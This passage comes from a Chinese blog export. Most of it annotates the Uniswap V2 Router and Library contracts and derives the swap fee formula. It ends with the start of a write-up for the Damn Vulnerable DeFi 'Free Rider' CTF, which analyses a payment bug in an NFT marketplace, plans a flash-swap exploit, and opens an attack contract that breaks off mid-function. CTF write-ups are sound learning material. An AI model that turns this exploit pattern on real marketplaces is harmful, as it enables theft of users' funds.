(amountA, amountB) = (amountAOptimal, amountBDesired); &#125; &#125; &#125; function addLiquidity( address tokenA, // 代币A address tokenB, // 代币B uint amountADesired, // 希望存入的代币A数量 uint amountBDesired, // 希望存入的代币B数量 uint amountAMin, // 用户可接受的最小成交代币A数量 uint amountBMin, // 用户可接受的最小成交代币B数量 address to, // 流动性代币接收地址 uint deadline // 该笔交易的有效时间，如果超过该时间还没得到交易处理就直接失效不进行交易了 ) external virtual override ensure(deadline) returns (uint amountA, uint amountB, uint liquidity) &#123; // 调用_addLiquidity函数，返回 代币A和代币B 的最佳汇率 (amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin); // 获取交易对地址 address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB); // 调用tokenA的`transferFrom`函数，实现msg.sender向交易对pair转入amountA代币 TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA); TransferHelper.safeTransferFrom(tokenB, msg.sender, pair, amountB); // 获取存入代币后uniswapv2中的流动性 liquidity = IUniswapV2Pair(pair).mint(to); &#125; /** 添加流动性 */ function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external virtual override payable ensure(deadline) returns (uint amountToken, uint amountETH, uint liquidity) &#123; // 调用_addLiquidity函数，返回 TOken和ETH的最佳汇率 (amountToken, amountETH) = _addLiquidity( token, WETH, amountTokenDesired, msg.value, amountTokenMin, amountETHMin ); // 获取交易对地址 address pair = UniswapV2Library.pairFor(factory, token, WETH); // 调用token的`transferFrom`函数，实现msg.sender向交易对pair转入amountToken代币 TransferHelper.safeTransferFrom(token, msg.sender, pair, amountToken); // 先把amountETH数量的ETH存入本合约 IWETH(WETH).deposit&#123;value: amountETH&#125;(); // 再将amount数量的WETH转入交易对中 assert(IWETH(WETH).transfer(pair, amountETH)); // 获取存入代币后uniswapv2中的流动性 liquidity = IUniswapV2Pair(pair).mint(to); // refund dust eth, if any // 如果还有剩余的ETH，将退还 if (msg.value &gt; amountETH) TransferHelper.safeTransferETH(msg.sender, msg.value - amountETH); &#125; // **** REMOVE LIQUIDITY **** // 移除流动性 function removeLiquidity( address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline ) public virtual override ensure(deadline) returns (uint amountA, uint amountB) &#123; // 获取交易对地址 address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB); // 将流动性代币从用户划转到 pair 合约 IUniswapV2Pair(pair).transferFrom(msg.sender, pair, liquidity); // send liquidity to pair // 收到的流动性代币占全部代币比例 (uint amount0, uint amount1) = IUniswapV2Pair(pair).burn(to); (address token0,) = UniswapV2Library.sortTokens(tokenA, tokenB); (amountA, amountB) = tokenA == token0 ? (amount0, amount1) : (amount1, amount0); // 如果低于用户设定的最低预期（amountAMin/amountBMin），则回滚交易 require(amountA &gt;= amountAMin, &#x27;UniswapV2Router: INSUFFICIENT_A_AMOUNT&#x27;); require(amountB &gt;= amountBMin, &#x27;UniswapV2Router: INSUFFICIENT_B_AMOUNT&#x27;); &#125; function removeLiquidityETH( address token, //待移除流动性的代币地址 uint liquidity, // 要移除的流动性数量 uint amountTokenMin, // 用户愿意接受的最小代币数量，如果实际返回的代币数量小于该值，则函数会抛出异常 uint amountETHMin, // 用户愿意接受的最小ETH数量，如果实际返回的ETH数量小于该值，则函数会抛出异常 address to, // 代币和ETH将被发送到的目标地址 uint deadline // 操作的截止时间，必须在该时间之前完成操作，否则操作将被视为无效 ) public virtual override ensure(deadline) returns (uint amountToken, uint amountETH) &#123; // 调用 removeLiquidity，得到退还的 Token 和 ETH // removeLiquidity中执行了 `burn`但是是将token和ETH转移到了addrss(this),说明还可以执行 safeTransfer 和 withdraw (amountToken, amountETH) = removeLiquidity( token, WETH, liquidity, amountTokenMin, amountETHMin, address(this), deadline ); // 向to转账(token) TransferHelper.safeTransfer(token, to, amountToken); // 将weth取出来，暂时存在addrss(this) IWETH(WETH).withdraw(amountETH); // 将address(this)中的WETH转到指定地址to TransferHelper.safeTransferETH(to, amountETH); &#125; // 其实就是在调用实际的 removeLiquidity 之前先用 permit 方式完成授权操作 function removeLiquidityWithPermit( address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external virtual override returns (uint amountA, uint amountB) &#123; address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB); uint value = approveMax ? uint(-1) : liquidity; IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s); (amountA, amountB) = removeLiquidity(tokenA, tokenB, liquidity, amountAMin, amountBMin, to, deadline); &#125; // 在调用实际的 removeLiquidity 之前先用 permit 方式完成授权操作 function removeLiquidityETHWithPermit( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external virtual override returns (uint amountToken, uint amountETH) &#123; address pair = UniswapV2Library.pairFor(factory, token, WETH); uint value = approveMax ? uint(-1) : liquidity; IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s); (amountToken, amountETH) = removeLiquidityETH(token, liquidity, amountTokenMin, amountETHMin, to, deadline); &#125; // **** REMOVE LIQUIDITY (supporting fee-on-transfer tokens) **** /** 返回值没有 amountToken； 调用 removeLiquidity 后也没有 amountToken 值返回 进行 safeTransfer 时传值直接读取当前地址的 token 余额。 */ function removeLiquidityETHSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) public virtual override ensure(deadline) returns (uint amountETH) &#123; (, amountETH) = removeLiquidity( token, WETH, liquidity, amountTokenMin, amountETHMin, address(this), deadline ); TransferHelper.safeTransfer(token, to, IERC20(token).balanceOf(address(this))); IWETH(WETH).withdraw(amountETH); TransferHelper.safeTransferETH(to, amountETH); &#125; function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) external virtual override returns (uint amountETH) &#123; address pair = UniswapV2Library.pairFor(factory, token, WETH); uint value = approveMax ? uint(-1) : liquidity; IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s); amountETH = removeLiquidityETHSupportingFeeOnTransferTokens( token, liquidity, amountTokenMin, amountETHMin, to, deadline ); &#125; // **** SWAP **** // requires the initial amount to have already been sent to the first pair function _swap(uint[] memory amounts, address[] memory path, address _to) internal virtual &#123; /** 历整个兑换路径，并对路径中每两个配对的 token 调用 pair 合约的兑换函数，实现底层的兑换处理 */ for (uint i; i &lt; path.length - 1; i++) &#123; (address input, address output) = (path[i], path[i + 1]); (address token0,) = UniswapV2Library.sortTokens(input, output); uint amountOut = amounts[i + 1]; // 如下语句是在判断要兑换的是哪种 货币，比如 A 或者 B (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOut) : (amountOut, uint(0)); address to = i &lt; path.length - 2 ? UniswapV2Library.pairFor(factory, output, path[i + 2]) : _to; IUniswapV2Pair(UniswapV2Library.pairFor(factory, input, output)).swap( amount0Out, amount1Out, to, new bytes(0) ); &#125; &#125; /** 用 ERC20 兑换 ERC20，但支付的数量是指定的，而兑换回的数量则是未确定的 */ function swapExactTokensForTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external virtual override ensure(deadline) returns (uint[] memory amounts) &#123; amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path); require(amounts[amounts.length - 1] &gt;= amountOutMin, &#x27;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&#x27;); // 将支付的代币转到 pair 合约 TransferHelper.safeTransferFrom( path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0] ); _swap(amounts, path, to); &#125; /** 用 ERC20 兑换 ERC20，与上一个函数不同，指定的是兑换回的数量 */ function swapTokensForExactTokens( uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline ) external virtual override ensure(deadline) returns (uint[] memory amounts) &#123; amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path); require(amounts[0] &lt;= amountInMax, &#x27;UniswapV2Router: EXCESSIVE_INPUT_AMOUNT&#x27;); TransferHelper.safeTransferFrom( path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0] ); _swap(amounts, path, to); &#125; /** 指定 ETH 数量兑换 ERC20 */ function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external virtual override payable ensure(deadline) returns (uint[] memory amounts) &#123; require(path[0] == WETH, &#x27;UniswapV2Router: INVALID_PATH&#x27;); amounts = UniswapV2Library.getAmountsOut(factory, msg.value, path); require(amounts[amounts.length - 1] &gt;= amountOutMin, &#x27;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&#x27;); IWETH(WETH).deposit&#123;value: amounts[0]&#125;(); assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0])); _swap(amounts, path, to); &#125; /** 用 ERC20 兑换成指定数量的 ETH */ function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external virtual override ensure(deadline) returns (uint[] memory amounts) &#123; require(path[path.length - 1] == WETH, &#x27;UniswapV2Router: INVALID_PATH&#x27;); amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path); require(amounts[0] &lt;= amountInMax, &#x27;UniswapV2Router: EXCESSIVE_INPUT_AMOUNT&#x27;); TransferHelper.safeTransferFrom( path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0] ); _swap(amounts, path, address(this)); IWETH(WETH).withdraw(amounts[amounts.length - 1]); TransferHelper.safeTransferETH(to, amounts[amounts.length - 1]); &#125; /** 用指定数量的 ERC20 兑换 ETH */ function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external virtual override ensure(deadline) returns (uint[] memory amounts) &#123; require(path[path.length - 1] == WETH, &#x27;UniswapV2Router: INVALID_PATH&#x27;); amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path); require(amounts[amounts.length - 1] &gt;= amountOutMin, &#x27;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&#x27;); TransferHelper.safeTransferFrom( path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0] ); _swap(amounts, path, address(this)); IWETH(WETH).withdraw(amounts[amounts.length - 1]); TransferHelper.safeTransferETH(to, amounts[amounts.length - 1]); &#125; /** 用 ETH 兑换指定数量的 ERC20 */ function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external virtual override payable ensure(deadline) returns (uint[] memory amounts) &#123; require(path[0] == WETH, &#x27;UniswapV2Router: INVALID_PATH&#x27;); amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path); require(amounts[0] &lt;= msg.value, &#x27;UniswapV2Router: EXCESSIVE_INPUT_AMOUNT&#x27;); IWETH(WETH).deposit&#123;value: amounts[0]&#125;(); assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0])); _swap(amounts, path, to); // refund dust eth, if any if (msg.value &gt; amounts[0]) TransferHelper.safeTransferETH(msg.sender, msg.value - amounts[0]); &#125; // **** SWAP (supporting fee-on-transfer tokens) **** // requires the initial amount to have already been sent to the first pair function _swapSupportingFeeOnTransferTokens(address[] memory path, address _to) internal virtual &#123; for (uint i; i &lt; path.length - 1; i++) &#123; (address input, address output) = (path[i], path[i + 1]); (address token0,) = UniswapV2Library.sortTokens(input, output); IUniswapV2Pair pair = IUniswapV2Pair(UniswapV2Library.pairFor(factory, input, output)); uint amountInput; uint amountOutput; &#123; // scope to avoid stack too deep errors (uint reserve0, uint reserve1,) = pair.getReserves(); (uint reserveInput, uint reserveOutput) = input == token0 ? (reserve0, reserve1) : (reserve1, reserve0); amountInput = IERC20(input).balanceOf(address(pair)).sub(reserveInput); amountOutput = UniswapV2Library.getAmountOut(amountInput, reserveInput, reserveOutput); &#125; (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOutput) : (amountOutput, uint(0)); address to = i &lt; path.length - 2 ? UniswapV2Library.pairFor(factory, output, path[i + 2]) : _to; pair.swap(amount0Out, amount1Out, to, new bytes(0)); &#125; &#125; /** 指定数量的 ERC20 兑换 ERC20，支持转账时扣费 */ function swapExactTokensForTokensSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external virtual override ensure(deadline) &#123; TransferHelper.safeTransferFrom( path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn ); uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to); _swapSupportingFeeOnTransferTokens(path, to); require( IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) &gt;= amountOutMin, &#x27;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&#x27; ); &#125; /** 指定数量的 ETH 兑换 ERC20，支持转账时扣费 */ function swapExactETHForTokensSupportingFeeOnTransferTokens( uint amountOutMin, address[] calldata path, address to, uint deadline ) external virtual override payable ensure(deadline) &#123; require(path[0] == WETH, &#x27;UniswapV2Router: INVALID_PATH&#x27;); uint amountIn = msg.value; IWETH(WETH).deposit&#123;value: amountIn&#125;(); assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn)); uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to); _swapSupportingFeeOnTransferTokens(path, to); require( IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) &gt;= amountOutMin, &#x27;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&#x27; ); &#125; /** 指定数量的 ETH 兑换 ERC20，支持转账时扣费 */ function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external virtual override ensure(deadline) &#123; require(path[path.length - 1] == WETH, &#x27;UniswapV2Router: INVALID_PATH&#x27;); TransferHelper.safeTransferFrom( path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn ); _swapSupportingFeeOnTransferTokens(path, address(this)); uint amountOut = IERC20(WETH).balanceOf(address(this)); require(amountOut &gt;= amountOutMin, &#x27;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&#x27;); IWETH(WETH).withdraw(amountOut); TransferHelper.safeTransferETH(to, amountOut); &#125; // **** LIBRARY FUNCTIONS **** function quote(uint amountA, uint reserveA, uint reserveB) public pure virtual override returns (uint amountB) &#123; return UniswapV2Library.quote(amountA, reserveA, reserveB); &#125; function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) public pure virtual override returns (uint amountOut) &#123; return UniswapV2Library.getAmountOut(amountIn, reserveIn, reserveOut); &#125; function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) public pure virtual override returns (uint amountIn) &#123; return UniswapV2Library.getAmountIn(amountOut, reserveIn, reserveOut); &#125; function getAmountsOut(uint amountIn, address[] memory path) public view virtual override returns (uint[] memory amounts) &#123; return UniswapV2Library.getAmountsOut(factory, amountIn, path); &#125; function getAmountsIn(uint amountOut, address[] memory path) public view virtual override returns (uint[] memory amounts) &#123; return UniswapV2Library.getAmountsIn(factory, amountOut, path); &#125;&#125; **解读 addLiquidity中的amountAMin 和 amountBMin ** 该值一般是由前端根据预期值和滑点值计算得出的。比如，预期值 amountADesired 为 1000，设置的滑点为 0.5%，那就可以计算得出可接受的最小值 amountAMin 为 1000 * (1 - 0.5%) &#x3D; 995。 addLiquidityETH addLiquidityETH 则支付的其中一个 token 则是 ETH，而不是 ERC20 代币。来看看其代码实现： 可看到，入参不再是两个 token 地址，而只有一个 token 地址，因为另一个是以太坊主币 ETH。预期支付的 ETH 金额也是直接从 msg.value 读取的，所以入参里也不需要 ETH 的 Desired 参数。但是会定义 amountETHMin 表示愿意接受成交的 ETH 最小额。 实现逻辑上，请注意，调用 _addLiquidity 时传入的第二个参数是 WETH。其实，addLiquidityETH 实际上也是将 ETH 转为 WETH 进行处理的。可以看到代码中还有这么一行： 1IWETH(WETH).deposit&#123;value: amountETH&#125;(); 这就是将用户转入的 ETH 转成了 WETH。 而最后一行代码则会判断，如果一开始支付的 msg.value 大于实际需要支付的金额，多余的部分将返还给用户 Library1. UniswapV2Library 代码解读如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122pragma solidity &gt;=0.5.0;import &#x27;@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol&#x27;;import &quot;./SafeMath.sol&quot;;library UniswapV2Library &#123; using SafeMath for uint; // returns sorted token addresses, used to handle return values from pairs sorted in this order // 给 tokenA和tokenB排序，按字面值排序 function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) &#123; require(tokenA != tokenB, &#x27;UniswapV2Library: IDENTICAL_ADDRESSES&#x27;); (token0, token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA); require(token0 != address(0), &#x27;UniswapV2Library: ZERO_ADDRESS&#x27;); &#125; // calculates the CREATE2 address for a pair without making any external calls // 输入工厂地址和两个代币地址，计算这两个代币的交易对地址 function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) &#123; // 先对这两个代币地址进行排序 (address token0, address token1) = sortTokens(tokenA, tokenB); // 采用create2的方式计算地址 pair = address(uint(keccak256(abi.encodePacked( hex&#x27;ff&#x27;, factory, keccak256(abi.encodePacked(token0, token1)), // UniswapV2Pair 合约的 creationCode 的哈希值 hex&#x27;96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f&#x27; // init code hash )))); &#125; // fetches and sorts the reserves for a pair function getReserves(address factory, address tokenA, address tokenB) internal view returns (uint reserveA, uint reserveB) &#123; // 先让 tokenA 和 tokenB 从小到大排列 (address token0,) = sortTokens(tokenA, tokenB); // 根据 `pairFor(factory, tokenA, tokenB)`算出一个新的地址 // .getReserves() 获取 该新地址的 reserve0，reserve1 (uint reserve0, uint reserve1,) = IUniswapV2Pair(pairFor(factory, tokenA, tokenB)).getReserves(); // 如果交换过顺序就交换输出，简单来说及时为了对应输入的形参 (reserveA, reserveB) = tokenA == token0 ? (reserve0, reserve1) : (reserve1, reserve0); &#125; // given some amount of an asset and pair reserves, returns an equivalent amount of the other asset /** 数量为amountA的代币A，按照合约中两种代币余额比例，换算成另一个代币B。此时不考虑手续费，因为仅是计价单位的换算 【根据给定的两个 token 的储备量和其中一个 token 数量，计算得到另一个 token 等值的数值】 */ function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) &#123; require(amountA &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_AMOUNT&#x27;); require(reserveA &gt; 0 &amp;&amp; reserveB &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#x27;); amountB = amountA.mul(reserveB) / reserveA; &#125; // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset /** 该方法计算：输入一定数量（amountIn）代币A，根据池子中代币余额，能得到多少数量（amountOut）代币B。 amountIn指输入的代币A，reserveIn 指代币A的存储量，reserveOut指代币B的存储量 【根据给定的两个 token 的储备量和输入的 token 数量，计算得到输出的 token 数量，该计算会扣减掉 0.3% 的手续费】 */ function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) &#123; require(amountIn &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT&#x27;); require(reserveIn &gt; 0 &amp;&amp; reserveOut &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#x27;); uint amountInWithFee = amountIn.mul(997); uint numerator = amountInWithFee.mul(reserveOut); uint denominator = reserveIn.mul(1000).add(amountInWithFee); amountOut = numerator / denominator; &#125; // given an output amount of an asset and pair reserves, returns a required input amount of the other asset /** 该方法计算当希望获得一定数量（amountOut）的代币B时，应该输入多少数量（amoutnIn）的代币A。 amountOut指要得到的代币B，reserveIn 指代币A的存储量，reserveOut指代币B的存储量 【根据给定的两个 token 的储备量和输出的 token 数量，计算得到输入的 token 数量，该计算会扣减掉 0.3% 的手续费】 */ function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) internal pure returns (uint amountIn) &#123; require(amountOut &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT&#x27;); require(reserveIn &gt; 0 &amp;&amp; reserveOut &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#x27;); uint numerator = reserveIn.mul(amountOut).mul(1000); uint denominator = reserveOut.sub(amountOut).mul(997); amountIn = (numerator / denominator).add(1); &#125; // performs chained getAmountOut calculations on any number of pairs /** 该方法用于计算在使用多个交易对时，输入一定数量（amountIn）的第一种代币， 最终能收到多少数量的最后一种代币（amounts）。amounts数组中的第一个元素表示amountIn， 最后一个元素表示该目标代币对应的数量。该方法实际上是循环调用getAmountIn方法。 【根据兑换路径和输入数量，计算得到兑换路径中每个交易对的输出数量】 */ function getAmountsOut(address factory, uint amountIn, address[] memory path) internal view returns (uint[] memory amounts) &#123; require(path.length &gt;= 2, &#x27;UniswapV2Library: INVALID_PATH&#x27;); // 创建一个和path等长的uint数组 amounts = new uint[](path.length); amounts[0] = amountIn; for (uint i; i &lt; path.length - 1; i++) &#123; (uint reserveIn, uint reserveOut) = getReserves(factory, path[i], path[i + 1]); amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut); &#125; &#125; // performs chained getAmountIn calculations on any number of pairs /** 与getAmountsOut相对，getAmountsIn用于计算当希望收到一定数量（amountOut）的目标代币， 应该分别输入多少数量的中间代币。计算方法也是循环调用getAmountIn。 */ function getAmountsIn(address factory, uint amountOut, address[] memory path) internal view returns (uint[] memory amounts) &#123; require(path.length &gt;= 2, &#x27;UniswapV2Library: INVALID_PATH&#x27;); amounts = new uint[](path.length); amounts[amounts.length - 1] = amountOut; for (uint i = path.length - 1; i &gt; 0; i--) &#123; (uint reserveIn, uint reserveOut) = getReserves(factory, path[i - 1], path[i]); amounts[i - 1] = getAmountIn(amounts[i], reserveIn, reserveOut); &#125; &#125;&#125; getAmountOut 的实现： 根据 AMM 的原理，恒定乘积公式「x * y &#x3D; K」，兑换前后 K 值不变。因此，在不考虑交易手续费的情况下，以下公式会成立： 1reserveIn * reserveOut = (reserveIn + amountIn) * (reserveOut - amountOut) 将公式右边的表达式展开，并推导下，就变成了： 12345reserveIn * reserveOut = reserveIn * reserveOut + amountIn * reserveOut - (reserveIn + amountIn) * amountOut-&gt;amountIn * reserveOut = (reserveIn + amountIn) * amountOut-&gt;amountOut = amountIn * reserveOut / (reserveIn + amountIn) 而实际上交易时，还需要扣减千分之三的交易手续费，所以实际上： 1amountIn = amountIn * 997 / 1000 代入上面的公式后，最终结果就变成了： 12345amountOut = (amountIn * 997 / 1000) * reserverOut / (reserveIn + amountIn * 997 / 1000)-&gt;amountOut = amountIn * 997 * reserveOut / 1000 * (reserveIn + amountIn * 997 / 1000)-&gt;amountOut = amountIn * 997 * reserveOut / (reserveIn * 1000 + amountIn * 997) 这即是最后代码实现中的计算公式了。 解读getAmountsOut 根据兑换路径和输入数量，计算得到兑换路径中每个交易对的输出数量。 举例： 假如一个交易地址数组 path[A,B,C,D] ，其中 pair(A,B)中的tokenA&#x3D;6，tokenB&#x3D;9； pair(B,C)中的tokenA&#x3D;10，tokenB&#x3D;8； pair(C,D)中的tokenA&#x3D;19，tokenB&#x3D;84 则 amounts[0] &#x3D; IN_tokenA, pair(A,B) : amount[1] &#x3D; getAmountOut(IN_tokenA, reserveA, reserveB), pair(B,C): amount[2] &#x3D; getAmountOut(IN_tokenA, reserveA, reserveB), pair(C,D): amount[3] &#x3D; getAmountOut(IN_tokenA, reserveA, reserveB). 该函数会计算 path 中每一个中间资产和最终资产的数量，比如 path 为 [A,B,C]，则会先将 A 兑换成 B，再将 B 兑换成 C。返回值则是一个数组，第一个元素是 A 的数量，即 amountIn，而第二个元素则是兑换到的代币 B 的数量，最后一个元素则是最终要兑换得到的代币 C 的数量。 从代码中还可看到，每一次兑换其实都调用了 getAmountOut 函数，这也意味着每一次中间兑换都会扣减千分之三的交易手续费。那如果兑换两次，实际支付假设为 1000，那最终实际兑换得到的价值只剩下： 11000 * (1 - 0.003) * (1 - 0.003) = 994.009 即实际支付的交易手续费将近千分之六了。兑换路径越长，实际扣减的交易手续费会更多，所以兑换路径一般不宜过长。 getAmountsIn同理 参考链接uniswap v2白皮书 链接1 uniswap v2代码 链接2 uiniswap v2代码core代码解读 链接3 登链社区","categories":[{"name":"Knowledge literacy","slug":"Knowledge-literacy","permalink":"https://biyouqiuqiu.com/categories/Knowledge-literacy/"},{"name":"uniswap","slug":"Knowledge-literacy/uniswap","permalink":"https://biyouqiuqiu.com/categories/Knowledge-literacy/uniswap/"}],"tags":[{"name":"Knowledge literacy","slug":"Knowledge-literacy","permalink":"https://biyouqiuqiu.com/tags/Knowledge-literacy/"},{"name":"uniswap v2","slug":"uniswap-v2","permalink":"https://biyouqiuqiu.com/tags/uniswap-v2/"}]},{"title":"Free Rider","slug":"Smart contracts/damn defi/Free Rider","date":"2023-07-14T15:37:10.000Z","updated":"2023-07-14T15:37:10.000Z","comments":true,"path":"2023/07/14/Smart contracts/damn defi/Free Rider/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/14/Smart%20contracts/damn%20defi/Free%20Rider/","excerpt":"","text":"1. issue A new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH. The developers behind it have been notified the marketplace is vulnerable. All tokens can be taken. Yet they have absolutely no idea how to do it. So they’re offering a bounty of 45 ETH for whoever is willing to take the NFTs out and send them their way. You’ve agreed to help. Although, you only have 0.1 ETH in balance. The devs just won’t reply to your messages asking for more. If only you could get free ETH, at least for an instant. 目标：将所有的 NFT 归还到卖家手里，获取赏金 题目链接 2. analysing本次挑战要求玩家有一定的 ERC721 和 uniswap v2 基础。 2.1 FreeRiderNFTMarketplace.sol如果对 ERC721 的每一个函数都比较清楚的话，不难看出在 _buyOne 函数中有一个明显的漏洞。 123456789101112131415161718192021222324252627282930function _buyOne(uint256 tokenId) private &#123; uint256 priceToPay = offers[tokenId]; if (priceToPay == 0) revert TokenNotOffered(tokenId); if (msg.value &lt; priceToPay) revert InsufficientPayment(); --offersCount; // transfer from seller to buyer DamnValuableNFT _token = token; // cache for gas savings /** 1. 在 ERC721 中的balance是货币的种类 2. _transfer(address from, address to, uint256 tokenId) 函数执行之后就会将 tokenId的所有权转交给 to 3. 此时执行 _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId)之后， msg.sender 就成为了该 tokenId的所有者 */ _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId); // pay seller using cached token /** 1. 这行代码的意思就是 msg.sender 向 _token.ownerOf(tokenId) 该tokenId的所有者支付费用priceToPay 2. 不难看出在 上一行代码中，卖家已经把tokenId先行卖给我了，我已经成为了该tokenId的主人 3. 所有这就是自己给自己支付priceToPay的ETH，简直太离谱 */ payable(_token.ownerOf(tokenId)).sendValue(priceToPay); emit NFTBought(msg.sender, tokenId, priceToPay);&#125; 归根结底，我们知道了可以免费购买 NTF，但首先我们得有 15 ETH才行，题中我们只有 0.1 ETH。 但是我们可以从 uniswap v2中通过闪电贷获取足够的 ETH. 1234567891011121314/** 思路： 1. 要通过 uniswapPair 中的swap函数借贷 15 WETH 用于购买NFT 1.1 求出 buymany 及其参数的 abi.encodeWithSignature(signatureString, arg); 1.2 将 15 WETH 转化成 15ETH, IWETH 1.3 需要有 receive函数 2. hacker需要实现 IUniswapV2Callee 的 uniswapV2Call 函数 2.1 在 uniswapV2Call 函数体中调用 marketplace 的buyMang函数 2.1.1 同时hacker需要实现IERC721Receiver接口 2.2 执行完 buyMany 函数之后，将 15ETH 转成 15WETH 还给 uniswapPair 2.3 此时 hacker成为了这 6种代币的主人 3. 通过 ERC721中的 safeTransferFrom 函数，获取赏金 */ 3. solving3.1 FreeRiderHack.sol123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &#x27;@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol&#x27;;import &#x27;@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol&#x27;;import &quot;./FreeRiderNFTMarketplace.sol&quot;;import &quot;../DamnValuableToken.sol&quot;;import &quot;../DamnValuableNFT.sol&quot;;import &quot;./FreeRiderRecovery.sol&quot;;import &quot;hardhat/console.sol&quot;;interface IERC20 &#123; function deposit() external payable; function approve(address spender, uint256 amount) external returns (bool); function balanceOf(address account) external returns (uint256); function withdraw(uint256 amount) external; function transfer(address to, uint256 amount) external returns (bool); function transferFrom( address from, address to, uint256 amount ) external returns (bool);&#125;contract FreeRiderHack is IUniswapV2Callee, IERC721Receiver&#123; IUniswapV2Pair uniswapPair; DamnValuableToken token; IERC20 weth; DamnValuableNFT nft; FreeRiderNFTMarketplace marketplace; FreeRiderRecovery recovery; uint256[] tokens = [0, 1, 2, 3, 4, 5]; constructor( address _uniswapPair, address _token, address _weth, address _nft, address payable _marketplace, address _recovery ) payable &#123; uniswapPair = IUniswapV2Pair(_uniswapPair); token = DamnValuableToken(_token); weth = IERC20(_weth); nft = DamnValuableNFT(_nft); marketplace = FreeRiderNFTMarketplace(_marketplace); recovery = FreeRiderRecovery(_recovery); &#125; function attack() external payable &#123; // 因为不确定 token 和 weth 在pair中的顺序，所以先判断 